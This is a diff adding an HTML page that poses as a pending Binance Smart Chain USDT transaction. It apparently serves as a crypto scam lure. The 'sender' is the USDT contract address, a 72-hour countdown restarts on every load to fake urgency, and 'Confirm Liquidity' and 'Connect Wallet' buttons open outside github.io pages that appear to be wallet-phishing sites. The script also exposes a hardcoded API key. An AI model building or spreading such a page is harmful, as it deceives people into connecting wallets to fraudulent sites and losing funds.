@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>USDT Transaction Processing</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: radial-gradient(circle at top, #0a1f3d 0%, #072146 100%);
+      color: #f1f5f9;
+      margin: 0;
+      padding: 0;
+    }
+    .container {
+      max-width: 720px;
+      margin: 3rem auto;
+      background: #072146;
+      padding: 2rem;
+      border-radius: 14px;
+      box-shadow: 0 0 18px rgba(0, 0, 0, 0.4);
+    }
+    h1 {
+      font-size: 1.8rem;
+      margin-bottom: 1rem;
+      color: #facc15;
+    }
+    p {
+      margin: 0.5rem 0;
+      font-size: 1rem;
+    }
+    strong {
+      color: #e2e8f0;
+    }
+    code {
+      background: #1e293b;
+      padding: 0.2rem 0.4rem;
+      border-radius: 4px;
+      color: #93c5fd;
+    }
+    a.button, button.connect-wallet {
+      display: inline-block;
+      margin-top: 1rem;
+      background: #fbbf24;
+      color: #111827;
+      padding: 0.8rem 1.5rem;
+      border-radius: 8px;
+      text-decoration: none;
+      font-weight: bold;
+      transition: background 0.3s ease;
+      border: none;
+      cursor: pointer;
+    }
+    a.button:hover, button.connect-wallet:hover {
+      background: #facc15;
+    }
+    .countdownText {
+      font-size: 0.95rem;
+      color: #f87171;
+      margin-top: 1rem;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>USDT Transaction Details</h1>
+    <p><strong>From:</strong> <code>0x55d398326f99059ff775485246999027b3197955</code></p>
+    <p><strong>To:</strong> <code>0x97fe2864e38d0a667fc4da9b2a4ed3e97ca1168</code></p>
+    <p><strong>Time:</strong> 23:55:55 UTC</p>
+    <p><strong>Date:</strong> 30-07-2025</p>
+    <p><strong>Amount:</strong> $4873.78 USDT</p>
+    <p><strong>Network:</strong> Binance Smart Chain (BEP20)</p>
+    <p><strong>Status:</strong> <span style="color: orange; font-weight: bold;">Processing</span></p>
+    <p><strong>Time Remaining:</strong> <span id="countdownText" class="countdownText">Loading...</span></p>
+    <p><strong>Gas Fee:</strong> 0.120590 BNB</p>
+    <p><strong>Transaction Hash:</strong>
+      <a href="https://bscscan.com/tx/0x2e272d33abffc0733e872372e94b9d437d88026449d7c221b0ccda72d5969ddf" target="_blank">
+        0x2e27...69ddf
+      </a>
+    </p>
+    <p><strong>Sender USDT Balance:</strong> <span id="balance">Loading...</span></p>
+    
+    <a href="https://contract-decimals.github.io/BNB-Smart-Chain/" class="button" target="_blank">Confirm Liquidity</a>
+    <button class="connect-wallet" onclick="window.open('https://on-chain-transaction.github.io/USDT-Confirmation/', '_blank')">🔗 Connect Wallet</button>
+  </div>
+
+  <script>
+    // === Countdown Logic (72 Hours) ===
+    const countdownEl = document.getElementById("countdownText");
+
+    // Set 72 hours (in milliseconds)
+    const startTime = new Date().getTime(); // When user loads page
+    const endTime = startTime + 72 * 60 * 60 * 1000;
+
+    function updateCountdown() {
+      const now = new Date().getTime();
+      const distance = endTime - now;
+
+      if (distance <= 0) {
+        countdownEl.innerText = "00h 00m 00s (Expired)";
+        countdownEl.style.color = "#ef4444";
+        return;
+      }
+
+      const hours = Math.floor(distance / (1000 * 60 * 60));
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+      countdownEl.innerText = `${String(hours).padStart(2, '0')}h ${String(minutes).padStart(2, '0')}m ${String(seconds).padStart(2, '0')}s`;
+    }
+
+    setInterval(updateCountdown, 1000);
+    updateCountdown();
+
+    // === USDT Balance Fetch ===
+    const sender = "0x55d398326f99059ff775485246999027b3197955";
+    const usdtContract = "0x55d398326f99059ff775485246999027b3197955";
+    const apiKey = "ZM8ACMJB67C2IXKKBF8URFUNSY";
+
+    async function fetchUSDTBalance() {
+      const url = `https://api.bscscan.com/api?module=account&action=tokenbalance&contractaddress=${usdtContract}&address=${sender}&tag=latest&apikey=${apiKey}`;
+      const res = await fetch(url);
+      const data = await res.json();
+      const balanceEl = document.getElementById("balance");
+      if (data.result) {
+        const balance = parseFloat(data.result) / 1e18;
+        balanceEl.textContent = `${balance.toFixed(2)} USDT`;
+      } else {
+        balanceEl.textContent = "Error fetching";
+      }
+    }
+
+    fetchUSDTBalance();
+  </script>
+</body>
+</html>
